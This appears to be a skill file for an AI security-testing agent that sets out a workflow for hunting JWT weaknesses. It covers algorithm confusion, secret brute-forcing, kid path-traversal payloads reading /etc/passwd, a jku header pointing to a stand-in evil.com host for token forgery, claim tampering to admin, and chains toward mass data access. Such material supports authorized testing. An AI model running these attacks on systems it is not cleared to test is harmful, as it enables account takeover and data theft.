---
name: hunt-jwt
description: "Hunting skill for JWT (JSON Web Token) vulnerabilities. Algorithm confusion, weak HMAC secret, kid injection, jku SSRF, claim injection, token replay. Use when testing endpoints that use JWT for authentication or session management."
---

# Hunt: JWT Attacks

## Detection
Extract JWT from `Authorization: Bearer <token>` or Cookie.
Decode via jwt_analyzer extension or jwt_tool.

## Attack Vectors

### Algorithm Confusion
Change `alg` in header:
```
HS256 → none (signature removed)
RS256 → HS256 (use public key as HMAC secret)
```
Test with jwt_analyzer(action="analyze", token="...")

### Weak HMAC Secret
If jwt uses HS256 with weak secret → brute-force offline:
```
jwt_analyzer(action="bruteforce", token="...")
jwt_analyzer(action="bruteforce", token="...", secretWordlist="secret,password,test,admin,jwt")
```

### kid (Key ID) Injection
```
"kid": "../../../etc/passwd"
"kid": "file:///etc/passwd"  
```
If server uses kid to fetch verification key without sanitization → path traversal.

### jku (JWK Set URL) SSRF
```
"jku": "http://evil.com/jwks.json"
```
If server fetches JWK set from jku URL → SSRF. Host controlled JWK → forge any token.

### Claim Injection
```
"sub": "admin"
"role": "admin"
"is_admin": true
```
Modify claims in token. If server doesn't validate, privilege escalation.

### Token Replay
Capture a valid token. Replay it after logout.
If token still works → no token revocation.

## Testing Workflow

1. Decode token: `jwt_analyzer(action="analyze", token="...")`
2. Check algorithm: if HS256, try brute-force. If RS256, try algorithm confusion.
3. Check kid: try path traversal and SSRF.
4. Check claims: modify sub, role, is_admin and try.
5. Check expiry: modify `exp` claim to future date.
6. Replay token after logout.

## Confirmation Gates
- Token accepted with alg=none → confirmed + critical
- Token forged with weak secret → confirmed + critical
- kid path traversal returns error with file content → confirmed + high
- Token accepted with modified claims → confirmed + critical
- Token works after logout → confirmed + medium

## Chain Templates
- JWT algorithm confusion + IDOR → forge admin token → mass data access
- JWT kid injection + SSRF → SSRF to internal service
- JWT claim injection + Business Logic → bypass payment/access controls
- JWT + OAuth → forge OAuth token from user JWT
